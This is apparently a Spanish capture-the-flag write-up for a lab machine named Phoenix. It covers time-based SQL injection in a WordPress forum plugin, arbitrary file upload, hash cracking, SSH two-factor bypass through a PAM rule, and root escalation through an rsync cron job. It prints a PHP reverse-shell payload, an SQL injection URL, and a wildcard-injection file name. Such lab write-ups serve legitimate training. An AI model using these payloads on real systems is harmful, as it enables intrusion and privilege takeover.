--------
- Tags: #sqli-timebassed #download-from-files #wordpress #password-crack #PAM #cron-job 
- -------
## Técnicas utilizadas
- Asgaros Forum Exploitation - Unauthenticated Blind Time Based SQL Injection (SQLI)  
- Download From Files 1.48 - Arbitrary File Upload (WordPress Plugin Exploitation)  
- Cracking Hashes  
- Abusing PAM configuration for the Secure Shell service (SSH)  
- Abusing Cron Job (Rsync Exploitation) [Privilege Escalation]
## Procedimiento

![[Pasted image 20230814202757.png]]

#### Reconocimiento
Un escaneo con **nmap** sobre los puertos activos de la maquina nos muestra los siguientes servicios y versiones:
```ruby
# nmap -sCV -p22,80,443 10.10.11.149 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-15 21:09 UTC
Nmap scan report for 10.10.11.149
Host is up (0.075s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9df387cd347583e03f50d839c6a5329f (RSA)
|   256 ab61ceebede28676e9e152faa5c77b20 (ECDSA)
|_  256 262e38cadf72d454fc75a49165cce8b0 (ED25519)
80/tcp  open  http     Apache httpd
|_http-server-header: Apache
|_http-title: Did not follow redirect to https://phoenix.htb/
443/tcp open  ssl/http Apache httpd
|_ssl-date: TLS randomness does not represent time
|_http-title: Did not follow redirect to https://phoenix.htb/
| ssl-cert: Subject: commonName=phoenix.htb/organizationName=Phoenix Security Ltd./stateOrProvinceName=Arizona/countryName=US
| Not valid before: 2022-02-15T20:08:43
|_Not valid after:  2032-02-13T20:08:43
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
| tls-alpn: 
|   h2
|_  http/1.1
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.21 seconds

```

Con **whatweb** podemos ver que tecnologías estan corriendo por detrás en el sitio web:
```ruby
# whatweb 10.10.11.149 && whatweb 10.10.11.149:443
http://10.10.11.149 [301 Moved Permanently] Apache, Country[RESERVED][ZZ], HTTPServer[Apache], IP[10.10.11.149], RedirectLocation[https://phoenix.htb/], Title[301 Moved Permanently], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY]
https://phoenix.htb/ [200 OK] Apache, Bootstrap[1.0.0,5.9], Country[RESERVED][ZZ], Email[phoenix@phoenix.htb], HTML5, HTTPServer[Apache], IP[10.10.11.149], JQuery[3.6.0], Lightbox, MetaGenerator[WordPress 5.9], Script[text/javascript], Title[Phoenix Security &#8211; Securing the future.], UncommonHeaders[link,x-content-type-options,upgrade], WordPress[5.9], X-Frame-Options[DENY]
http://10.10.11.149:443 [400 Bad Request] Apache, Country[RESERVED][ZZ], HTTPServer[Apache], IP[10.10.11.149], Title[400 Bad Request], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY]
```

-----------
#### Asgaros Forum Exploitation - Unauthenticated Blind Time Based SQL Injection (SQLI)
Visitando la pagina principal no encontramos nada de utilizadad. Podemos ir a la sección de **Login** para intentar algunas cosas desde alli. Vemos que, si al colocar un nombre que no existe, nos salta una alerta avisandonos de que el usuario no esta registrado:
![[Pasted image 20230815211412.png]]

Por otro lado, cuando el usuario existe, nos dice que usuario o contraseña no existantes:
![[Pasted image 20230815211346.png]]

Tenemos la posibildidad de registrar un nuevo usuario, asi que lo haremos. Una vez creado, podemos iniciar sesión y vemos el siguiente dashboard:
![[Pasted image 20230815211543.png]]

Si regresamos a la pagina principal, vemos que ahora nos aparece una pestaña de **Forum**:
![[Pasted image 20230815211614.png]]

Al acceder a ella, nos lleva a un forum donde hay un **Post** del usuario **Phoenix**:
![[Pasted image 20230815211637.png]]

Pero dentro no encontramos nada relevante que nos llame completamente la atención. Dentro de los post que encontramos en el dashboard, encontramos un post escrito por el usuario **John Smith** el cual parece ser otro usuario valido a nivel web:
![[Pasted image 20230815211707.png]]

Dato curioso, es que muchas veces podemos sacar un listado potencial de usuarios gracias a algunas APIS de **Wordpress**, si lanzamos una peticion a **/wp-json/wp/v2/users/** (puede variar, en algunos casos tendra otros nombres) podemos ver el listado:
```json
# curl -s -X GET "https://phoenix.htb/wp-json/wp/v2/users/" -k | jq '.[] | {name, description}'
{
  "name": "John Smith",
  "description": ""
}
{
  "name": "Phoenix",
  "description": "WordPress Administrator"
}
```

El listado solo nos muestra los usuarios que ya conociamos de antes. Otra cosa con la que podriamos sacar información valiosa del **WordPress** sera enumerando sus **Plugins**, podemos hacerlo con **WPScan** que lo hace automaticamente, o tirar directamente de **WFUZZ** y con el diccionario de **SecLists** (/usr/share/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt):
![[Pasted image 20230815212114.png]]

Pero vemos que hay un tipo de **WAF** ( Web Application Firewall ) que nos bloquea cuando hacemos fuerza bruta. Otra forma de enumerar plugins, seria tirar directamente de **Curl** y **Grep** para filtrar por la ruta de **Plugins** que suele ser **/wp-content/plugins**:
¡![[Pasted image 20230815213449.png]]

Con este listado de plugins, ahora podemos pasar a intentar buscar vulnerabilidades para estos. Buscando por google, encontramos con el siguiente articulo que nos explica como explotar un **SQLi** para la versión que se esta usando de [Asgaros](https://wpscan.com/vulnerability/36cc5151-1d5e-4874-bcec-3b6326235db1), solo tendriamos que atender a la siguiente ruta:
```
/forum/?subscribe_topic=1%20union%20select%201%20and%20sleep(10)
```

Al hacer la petición, vemos que tarda los 10 segundos en responder asi que es vulnerable. Podemos scriptarnos algo en **Python3** para dumpear toda la base de datos o directamente tirar de **SQLmap**. Iremos tiro hecho, dado que inyecciones basadas en tiempo suelen demorar muchisimo tiempo.
Dentro de la base de datos, podemos enumerar plugins, uno de ellos es vulnerable y lleva por nombre **Download-From-Files**, si intentamos buscar por exploits para este plugins con **SearchSploit** podemos encontrar encontrar uno de tipo **Arbitrary File Upload**:
![[Pasted image 20230815214345.png]]

----------
#### Download From Files 1.48 - Arbitrary File Upload (WordPress Plugin Exploitation)  
Revisando el exploit, vemos que esta escrito en **Python3**, analizando un poco el codigo vemos que no esta contemplando si el sitio es **HTTP/S** pero podemos arreglarlo facilmente si importamos la libreria `import urllib3` y posteriormente, debajo de los `import's` agregamos esta linea `urllib3.disable_warnings()` y en todas las partes donde se realice una petición (ya se por GET o POST) vamos agregar un `verify=False`.

Ahora, simplemente creamos un archivo **.php**  que nos ejecute una **Reverse Shell**:
```php
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.30/443 0>&1'"); ?>
```

Y con el script lo vamos a subir:
```
# python3 40934.py https://phoenix.htb ./shell.php
```

Esto, nos generara un output, el cual contendra la ruta del script en la web. Si nos ponemos en escucha y posteriormente visitamos la pagina vemos uqe nos cae la **Reverse Shell**

--------------
#### Cracking Hashes  
Si enumerarmos el **wp-config.php** (suele contener credenciales para la base de datos) podemos ver una credencial para a la base de datos:
![[Pasted image 20230815214429.png]]

Podemos conectarnos e intentar dumpear los tipicos hashes de los usuarios de **WordPress**:
![[Pasted image 20230815220326.png]]

Luego, intentamos romperlos con **John** o **HashCat** para ver las credenciales en texto plano:
![[Pasted image 20230815220338.png]]

Al intentar conectarnos como **Editor** (dado que es el unico usuario disponible, dejando de lado a Phoenix) por SSH vemos que nos pide un codigo de verificacion:
![[Pasted image 20230815220427.png]]

----------
#### Abusing PAM configuration for the Secure Shell service (SSH)  
Podemos intentar atentar contra el **Pam** el cual, suele tener configuraciones para el inicio de sesión. Si listamos el archivo de configuracion para el inicio de sesión (/etc/pam.d/sshd) vemos que hace alución a una ruta de configuracion:
```ruby
# cat /etc/pam.d/sshd | grep -vE "#" | sed '/^\s*$/d'
@include common-auth
auth [success=1 default=ignore] pam_access.so accessfile=/etc/security/access-local.conf
auth required pam_google_authenticator.so nullok user=root secret=/var/lib/twofactor/${USER}
account    required     pam_nologin.so
@include common-account
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
@include common-session
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    required     pam_limits.so
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open
@include common-password
```

Si le hacemos un **cat** para ver su contenido, nos muestra lo siguiente:
```ruby
# cat /etc/security/access-local.conf
+ : ALL : 10.11.12.13/24
- : ALL : ALL
```

Esto, basicamente se resume en que si nos conectamos por esa intefaz de red señalada en el archivo, no vamos a requerir del codigo de verificación. La cagada esta, en que la IP señadala, es la misma IP asignada para esta maquina, asi que si nos conectamos por SSH con esa IP, nos estaremos conectado a la misma maquina:
![[Pasted image 20230815220822.png]]

----------------------
#### Abusing Cron Job (Rsync Exploitation) [Privilege Escalation]
Lo que nos queda por hacer, es subir **Pspy** o directamente scripteando un **ProcMon** con **Bash** pero nos dara por culos por que en el **mount** esta definido el `hideid=2` el cual no nos permite listar procesos de otros usuarios, sin embargo, con **Pspy** contamos con el parametro **-f** el cual nos permite tratar de listar procesos (Archivos abiertos, editados, cerrados) pero no llegamos a dar con nada.

Buscando por archivos, llegamos a dar con uno interesante de nombre **cron.sh.x** el cual parece ejecutar un par de instrucciones las cuales no crean un **BackUp**. Podemos aprovecharnos de **Pspy** para ver que procesos esta ejecutando por detras y vemos lo siguiente:
![[Pasted image 20230815221921.png]]
''
Vemos que se esta ejecutando `rsync`, si listamos maneras de ganar shell con este comando en [GTFobins](https://gtfobins.github.io/gtfobins/rsync/#shell) vemos la siguiente:
```bash
rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
```

Como probablemente, el script este haciendo uso de **WildCard** (\*)  dado que en el **PsPy** vimos que esta aplicando el **rsync** a todos los archivos del directorio, podemos abusar de esto.
Simplemente creamos un archivo con el siguiente nombre:
```
$> touch -- '-e sh privesc.sh'
```

El archivo **privesc.sh** contiene un comando que asignara **SUID** a la bash. Solo bastaria esperar que **Root** ejecute el archivo gracias a la tarea cron para que la **Bash** se convierta en **4755**.